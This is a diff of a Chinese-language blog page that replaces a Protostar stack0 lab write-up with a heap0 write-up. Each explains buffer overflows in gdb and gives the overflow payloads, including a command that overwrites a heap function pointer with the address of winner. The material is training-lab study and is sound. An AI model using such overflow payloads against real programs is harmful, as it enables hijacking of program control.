@@ -4,14 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Pwn-protostar靶场1 stack_zero, 8023">
+    <meta name="keywords" content="Pwn-protostar靶场5 heap_zero, 8023">
     <meta name="description" content="
 
-Pwn-protostar靶场1  stack_zero本靶场所有程序源码包括靶场虚拟机镜像地址
-https:&amp;#x2F;&amp;#x2F;exploit.education&amp;#x2F;protostar
-
-stack zero源码：
-#in">
+Pwn-protostar靶场5 heap_zero什么是堆堆是动态内存分配的区域，程序在运行时用来分配内存。它与栈不同，栈用于静态分配内存，并且具有固定的大小
+程序使用如malloc、calloc、realloc等函数在堆上动态分配内">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +20,7 @@ stack zero源码：
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Pwn-protostar靶场1 stack_zero | 8023</title>
+    <title>Pwn-protostar靶场5 heap_zero | 8023</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
     
 
@@ -309,12 +306,12 @@ stack zero源码：
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Pwn-protostar靶场1 stack_zero</h1>
+                    <h1 class="description center-align post-title">Pwn-protostar靶场5 heap_zero</h1>
                 </div>
             </div>
         </div>
@@ -363,7 +360,7 @@ stack zero源码：
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-11-18
+                    2024-11-15
                 </div>
                 
 
@@ -377,14 +374,14 @@ stack zero源码：
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    4 分
                 </div>
                 
 
@@ -429,158 +426,93 @@ stack zero源码：
             <div id="articleContent">
                 <span id="more"></span>
 
-<h1 id="Pwn-protostar靶场1-stack-zero"><a href="#Pwn-protostar靶场1-stack-zero" class="headerlink" title="Pwn-protostar靶场1  stack_zero"></a>Pwn-protostar靶场1  stack_zero</h1><p>本靶场所有程序源码包括靶场虚拟机镜像地址</p>
-<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;exploit.education&#x2F;protostar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>stack zero源码：</p>
+<h1 id="Pwn-protostar靶场5-heap-zero"><a href="#Pwn-protostar靶场5-heap-zero" class="headerlink" title="Pwn-protostar靶场5 heap_zero"></a>Pwn-protostar靶场5 heap_zero</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>堆是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D&spm=1001.2101.3001.7020">动态内存分配</a>的区域，程序在运行时用来分配内存。它与栈不同，栈用于静态分配内存，并且具有固定的大小</p>
+<p>程序使用如malloc、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=calloc&spm=1001.2101.3001.7020">calloc</a>、realloc等函数在堆上动态分配内存。当内存不再需要时，使用free函数释放。</p>
+<p>接下来就用实战来讲解堆的运作机制</p>
+<h2 id="heap-0"><a href="#heap-0" class="headerlink" title="heap 0"></a>heap 0</h2><p>查看源码：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
 
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
+<span class="token keyword">struct</span> <span class="token class-name">data</span> <span class="token punctuation">&#123;</span>  #定义了一个名为data的结构体
+  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  #包含一个<span class="token number">64</span>字节大小的字符数组name
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token class-name">fp</span> <span class="token punctuation">&#123;</span>  #定义了一个名为fp的结构体
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #包含了一个函数指针fp
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  #自定义函数winner
 <span class="token punctuation">&#123;</span>
-  <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
-  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"level passed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出level passed
+<span class="token punctuation">&#125;</span>
 
-  modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">nowinner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  #自定义函数nowinner
+<span class="token punctuation">&#123;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"level has not been passed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出level has not been passed
+<span class="token punctuation">&#125;</span>
 
-  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have changed the 'modified' variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  #主函数，从命令行获取参数
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">data</span> <span class="token operator">*</span>d<span class="token punctuation">;</span>  #声明了一个指向 <span class="token keyword">struct</span> <span class="token class-name">data</span> 类型结构体的指针 d
+  <span class="token keyword">struct</span> <span class="token class-name">fp</span> <span class="token operator">*</span>f<span class="token punctuation">;</span>  #声明了一个指向 <span class="token keyword">struct</span> <span class="token class-name">fp</span> 类型结构体的指针 f
 
-<h3 id="gets函数漏洞："><a href="#gets函数漏洞：" class="headerlink" title="gets函数漏洞："></a>gets函数漏洞：</h3><p><img src="/img/98395e2dd8699221a3b9fbf7a231cffc.png"> </p>
-<p>永远不要使用gets函数，因为如果事先不知道数据，就无法判断gets将读取多少个字符，因为gets将继续存储字符当超过缓冲区的末端时，使用它是极其危险的，它会破坏计算机安全，请改用fgets。 </p>
-<h2 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h2><p> 我们使用gdb打开程序进行进一步的分析 </p>
-<pre class="line-numbers language-none"><code class="language-none">gdb &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #给data结构体分配内存
+  f <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #给fp结构体分配内存
+  f<span class="token operator">-></span>fp <span class="token operator">=</span> nowinner<span class="token punctuation">;</span>  #fp结构体中的函数指针初始化为指向nowinner函数
 
-<p><img src="/img/1731285612070.png"></p>
-<p>然后查看汇编代码，了解程序堆栈如何工作</p>
-<pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor intel 参数让汇报代码美观一点
-disassemble main  显示所有的汇编程序指令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data is at %p, fp is at %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出data和fp结构体的内存地址
 
-<p><img src="/img/1731285694825.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">Dump of assembler code for function main:
-0x080483f4 &lt;main+0&gt;:    push   ebp
-0x080483f5 &lt;main+1&gt;:    mov    ebp,esp
-0x080483f7 &lt;main+3&gt;:    and    esp,0xfffffff0
-0x080483fa &lt;main+6&gt;:    sub    esp,0x60
-0x080483fd &lt;main+9&gt;:    mov    DWORD PTR [esp+0x5c],0x0
-0x08048405 &lt;main+17&gt;:   lea    eax,[esp+0x1c]
-0x08048409 &lt;main+21&gt;:   mov    DWORD PTR [esp],eax
-0x0804840c &lt;main+24&gt;:   call   0x804830c &lt;gets@plt&gt;
-0x08048411 &lt;main+29&gt;:   mov    eax,DWORD PTR [esp+0x5c]
-0x08048415 &lt;main+33&gt;:   test   eax,eax
-0x08048417 &lt;main+35&gt;:   je     0x8048427 &lt;main+51&gt;
-0x08048419 &lt;main+37&gt;:   mov    DWORD PTR [esp],0x8048500
-0x08048420 &lt;main+44&gt;:   call   0x804832c &lt;puts@plt&gt;
-0x08048425 &lt;main+49&gt;:   jmp    0x8048433 &lt;main+63&gt;
-0x08048427 &lt;main+51&gt;:   mov    DWORD PTR [esp],0x8048529
-0x0804842e &lt;main+58&gt;:   call   0x804832c &lt;puts@plt&gt;
-0x08048433 &lt;main+63&gt;:   leave
-0x08048434 &lt;main+64&gt;:   ret
-End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>d<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #strcpy函数将命令行提供的第一个参数，复制到data结构体的name数组中
+  
+  f<span class="token operator">-></span><span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #调用函数指针指向的函数nowinner
 
-<p> 第一条是将ebp推入栈中，ebp是cpu的一个寄存器，它包含一个地址，指向堆栈中的某个位置，它存放着栈底的地址 </p>
-<p><img src="/img/1731285961101.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">0x080483f7 &lt;main+3&gt;:    and    esp,0xfffffff0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> AND 指令可以清除一个操作数中的 1 个位或多个位，同时又不影响其他位。这个技术就称为位屏蔽，就像在粉刷房子时，用遮盖胶带把不用粉刷的地方（如窗户）盖起来，在这里，它隐藏了esp的地址 </p>
-<pre class="line-numbers language-none"><code class="language-none">0x080483fa &lt;main+6&gt;:    sub    esp,0x60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>漏洞发生在strcpy函数处，strcpy函数不会检查目标缓冲区的大小，如果我们提供的参数超过64字节，它将导致缓冲区溢出，如果发生了缓冲区溢出，并且覆盖了f-&gt;fp的值，那么可以使它指向winner函数，调用winner函数</p>
+<p>我们先在第一个malloc函数调用的地方下一个断点，然后执行到断点处，来看看堆是怎么运行的<br><img src="/img/1731651000226.png"></p>
+<p><img src="/img/1731651041952.png"></p>
+<p> 现在停在了malloc函数处，还没有执行该指令，可以看到程序空间里是没有堆的 </p>
+<p><img src="/img/1731651095275.png"></p>
+<p> 输入n执行malloc函数，再次查看程序空间 </p>
+<p><img src="/img/1731651128567.png"></p>
+<p> 可以看到，多出了一个heap空间，也就是堆，地址是<strong>0x804a000-0x806b000</strong>，我们查看这个堆空间里的数据 </p>
+<p><img src="/img/1731651201278.png"></p>
+<p><strong>现在堆里只有两个数据，0x49-1，0x48是第一个mallco函数给我们分配的空间大小，为什么要减一呢，因为在这个堆中保存数据是，为了区分是否是空闲区域，都会在表示大小的值后面加一个1，+1了就说明当前空间已经被存放了数据，那这里为什么后面存放的数据都是0呢，是因为这个程序是从命令行参数里获取值然后保存的，我们运行程序时没有输入参数，所以这里都是0</strong></p>
+<p><img src="/img/1731651341707.png"></p>
+<p><img src="/img/1731651402046.png"></p>
+<p> name函数大小设置的是64字节，为什么程序给我们分配了72字节的空间，其实是这样算的 </p>
+<p><img src="/img/1731651437317.png"></p>
+<p>程序还将前面保留的四个字节空闲空间和本身表示大小的空间算进去了，也就是72-8=64</p>
+<p>而最后的0x20fb9，表示空余堆空间的大小，我们在程序执行strcpy函数的地方下一个断点，这个地方是程序将我们输入的值存入堆里的地方</p>
+<p><img src="/img/1731651560618.png"></p>
+<p> 我们重新运行程序，输入a，执行strcpy函数的指令，再在查看栈空间 </p>
+<p><img src="/img/1731651801387.png"></p>
+<p><img src="/img/1731651845072.png"></p>
+<p> 程序已经将我们输入的8个a的十六进制值放入了堆，并且下面还有第二个mallco函数的空间 </p>
+<p><img src="/img/1731651909176.png"></p>
+<p> 而这个0x8048478则是nowinner函数地址 </p>
+<p><img src="/img/1731651969975.png"></p>
+<p>前面说过，strcpy函数不会检查目标缓冲区的大小，如果我们提供的参数超过64字节，它将导致缓冲区溢出，如果发生了缓冲区溢出，并且覆盖了f-&gt;fp的值，那么可以使它指向winner函数，调用winner函数，我们输入76个字符就能完整覆盖nowinner函数地址，控制程序跳转的地址</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"print('A'*72 + 'B'*4)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> 然后esp减去0x60</p>
-<pre class="line-numbers language-none"><code class="language-none">0x080483fd &lt;main+9&gt;:    mov    DWORD PTR [esp+0x5c],0x0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/img/1731652294786.png"></p>
+<p><img src="/img/1731652379886.png"></p>
+<p>这里程序提示跳转到了0x42424242的地址，也就是我们输入的BBBB，这时我们查看堆空间 </p>
+<p><img src="/img/1731652460733.png"></p>
+<p>这表示 我们已经将nowinner函数地址给覆盖了 </p>
+<p><img src="/img/1731652503710.png"></p>
+<p> 我们将BBBB改为winner函数地址，就成功破解了程序 </p>
+<p><img src="/img/1731652536682.png"></p>
+<p> 我们可以使用echo工具来输入不可见字符 </p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;heap0 &quot;&#96;&#x2F;bin&#x2F;echo -ne &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x64\x84\x04\x08&quot;&#96;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> 在内存移动的位置为0，在堆栈上的偏移为0x5c<br> 段地址+偏移地址=物理地址<br> <strong>举一个例子，你从家到学校有2000米，这2000米就是物理地址，你从家到医院有1500米，离学校还要500米，这剩下的500米就是偏移地址</strong> </p>
-<pre class="line-numbers language-none"><code class="language-none">0x08048405 &lt;main+17&gt;:   lea    eax,[esp+0x1c]
-0x08048409 &lt;main+21&gt;:   mov    DWORD PTR [esp],eax
-0x0804840c &lt;main+24&gt;:   call   0x804830c &lt;gets@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p> lea操作是取有效地址，也就是取esp地址+偏移地址0x1c处的堆栈<br> 然后DWORD PTR要取eax的地址到esp中<br> 调用gets函数 </p>
-<pre class="line-numbers language-none"><code class="language-none">0x08048411 &lt;main+29&gt;:   mov    eax,DWORD PTR [esp+0x5c]
-0x08048415 &lt;main+33&gt;:   test   eax,eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p> 然后对比之前设置的值，0，用test来检查 </p>
-<p>接下来就是if的循环操作</p>
-<pre class="line-numbers language-none"><code class="language-none">0x08048417 &lt;main+35&gt;:   je     0x8048427 &lt;main+51&gt;
-0x08048419 &lt;main+37&gt;:   mov    DWORD PTR [esp],0x8048500
-0x08048420 &lt;main+44&gt;:   call   0x804832c &lt;puts@plt&gt;
-0x08048425 &lt;main+49&gt;:   jmp    0x8048433 &lt;main+63&gt;
-0x08048427 &lt;main+51&gt;:   mov    DWORD PTR [esp],0x8048529
-0x0804842e &lt;main+58&gt;:   call   0x804832c &lt;puts@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h2><h3 id="方法一：溢出"><a href="#方法一：溢出" class="headerlink" title="方法一：溢出"></a>方法一：溢出</h3><p>我们先在gets函数地址下一个断点，这样程序在运行到这个地址时会停止继续运行下一步操作。 </p>
-<pre class="line-numbers language-none"><code class="language-none">b *0x0804840c     #断点意思就是让程序执行到此“停住”，不再往下执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p> 然后在调用gets函数后下一个断点，来看我们输入的字符串在哪里 </p>
-<pre class="line-numbers language-none"><code class="language-none">b *0x08048411<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/img/1731286435341.png"></p>
-<p>然后设置</p>
-<pre class="line-numbers language-none"><code class="language-none">define hook-stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p> 这个工具可以帮助我们在每一步操作停下来后，自动的运行我们设置的命令 </p>
-<pre class="line-numbers language-none"><code class="language-none">info registers   &#x2F;&#x2F;显示寄存器里的地址
-x&#x2F;24wx $esp      &#x2F;&#x2F;显示esp寄存器里的内容
-x&#x2F;2i $eip        &#x2F;&#x2F;显示eip寄存器里的内容
-end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p> 然后我们输入run运行程序到第一个断点 </p>
-<p><img src="/img/1731286657496.png"></p>
-<p><img src="/img/1731286826301.png"></p>
-<p> 现在我们马上就要执行gets函数了，输入n执行gets函数（单步执行）</p>
-<p> 我们随意输入一些内容，按下回车键 </p>
-<p><img src="/img/1731286911539.png"></p>
-<p><img src="/img/1731287011867.png"></p>
-<p>可以看到0x61是a的ascii码</p>
-<pre class="line-numbers language-none"><code class="language-none">x&#x2F;wx $esp+0x5c            &#x2F;&#x2F;查看esp地址+0x5c偏移地址的内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/img/1731287066725.png"></p>
-<p> 算了一下，我们需要68个字符才能覆盖(从第一个0x61开始一共有16个4字节才能到0x00000000，要覆盖他还有4字节，所以一共68个字节)<br> 输入q退出gdb<br> 然后使用echo或者python对程序进行输入(二选一)</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'print "a"*(16*4+4)'</span> <span class="token operator">|</span> <span class="token operator">/</span>opt<span class="token operator">/</span>protostar<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">echo &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; | &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/img/1731287448288.png"></p>
-<p> 可以看到，我们已经成功打印出了正确的字符 </p>
-<h3 id="方式二：更改eip寄存器的值"><a href="#方式二：更改eip寄存器的值" class="headerlink" title="方式二：更改eip寄存器的值"></a>方式二：更改eip寄存器的值</h3><p>寄存器的功能是存储二进制代码，不同的寄存器有不同的作用，这里，我们要认识一个很重要的寄存器，他叫做EIP，在<strong>64</strong>位程序里叫做<strong>RIP</strong>，<strong>他是程序的指针</strong>，指针就是寻找地址的，指到什么地址，就会运行该地址的参数，控制了这个指针，就能控制整个程序的运行<br>重新打开程序，由于我们可以控制eip寄存器，随便在哪下一个断点都行，我这里在程序头下一个断点</p>
-<pre class="line-numbers language-none"><code class="language-none">b main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p> 运行程序到断点处 </p>
-<p> 查看所有寄存器的值 </p>
-<pre class="line-numbers language-none"><code class="language-none">info registers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/img/1731287668724.png"></p>
-<p><img src="/img/1731287789478.png"></p>
-<p> 我打的断点地址为0x80483fd而eip寄存器的值也是0x80483fd </p>
-<p> 查看程序汇编代码 </p>
-<p><img src="/img/1731287864176.png"></p>
-<p>如果我们输入的值和程序设置的值不一样，就会跳转到0x8048427这个位置，然后输出try again，也就是破解失败，所以我们将eip寄存器的值修改成0x8048419，下一个地址调用了put函数，输出的是you have changed the ‘modified’ variable也就是破解成功了<br>现在我们修改eip寄存器的值</p>
-<pre class="line-numbers language-none"><code class="language-none">set $eip&#x3D;0x8048419<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p> 修改后再次查看所有寄存器里的值，可以看到，现在eip指向了我们指定的地址 </p>
-<p><img src="/img/1731287958947.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">n &#x2F;&#x2F;执行下一个地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/img/1731287994713.png"></p>
-<p>破解成功</p>
-<h3 id="方式三：修改eax寄存器的值"><a href="#方式三：修改eax寄存器的值" class="headerlink" title="方式三：修改eax寄存器的值"></a>方式三：修改eax寄存器的值</h3><p> 最直接的方法是改变对比的值，使eax寄存器的值为不等于0，因为程序源代码逻辑为不等于0后才会输出正确的提示字符you have changed the ‘modified’ variable </p>
-<p> 在对比的地方下一个断点 </p>
-<pre class="line-numbers language-none"><code class="language-none">b *0x08048415<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/img/1731288172489.png"></p>
-<p> 查看所有寄存器里的值 </p>
-<p><img src="/img/1731288229480.png"></p>
-<p> 修改eax寄存器里的值 </p>
-<pre class="line-numbers language-none"><code class="language-none">set $eax &#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/img/1731288271210.png"></p>
-<p> 然后继续运行程序 </p>
-<p><img src="/img/1731288308240.png"></p>
-<p>破解成功！</p>
+<p><img src="/img/1731652676257.png"></p>
+<p>成功跳转到winner函数</p>
+<p><img src="/img/1731652703072.png"></p>
+<p>堆是一个很难的部分，为了方便入门，这篇文章只是简单的介绍了一些堆的运作机制，之后的文章再慢慢介绍其他的机制</p>
 
                 
             </div>
@@ -607,7 +539,7 @@ end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Pr0b1em.github.io/2024/11/18/Pwn-protostar%E9%9D%B6%E5%9C%BA1%20%20stack_zero/">https://Pr0b1em.github.io/2024/11/18/Pwn-protostar%E9%9D%B6%E5%9C%BA1%20%20stack_zero/</a>
+                    <a href="https://Pr0b1em.github.io/2024/11/15/Pwn-protostar%E9%9D%B6%E5%9C%BA5%20heap%20zero/">https://Pr0b1em.github.io/2024/11/15/Pwn-protostar%E9%9D%B6%E5%9C%BA5%20heap%20zero/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -729,13 +661,13 @@ end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA2%20stack%20one%EF%BC%8Cstack%20two/">
+                <a href="/2024/11/16/Pwn-protostar%E9%9D%B6%E5%9C%BA6%20heap%20one/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="Pwn-protostar靶场6 heap one">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">Pwn-protostar靶场6 heap one</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -746,15 +678,27 @@ end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-03
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-11-16
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Pr0b1em
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    学习
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -766,13 +710,13 @@ end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/05/30/UUCTF%20writeup/">
+                <a href="/2024/11/14/Pwn-protostar%E9%9D%B6%E5%9C%BA4%20stack%20five,stack%20six,stack%20seven/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="UUCTF writeup">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Pwn-protostar靶场4 stack five,，stack six，stack seven">
                         
-                        <span class="card-title">UUCTF writeup</span>
+                        <span class="card-title">Pwn-protostar靶场4 stack five,，stack six，stack seven</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -783,14 +727,14 @@ end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/writeup/" class="post-category">
-                                    writeup
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    学习
                                 </a>
                             
                             
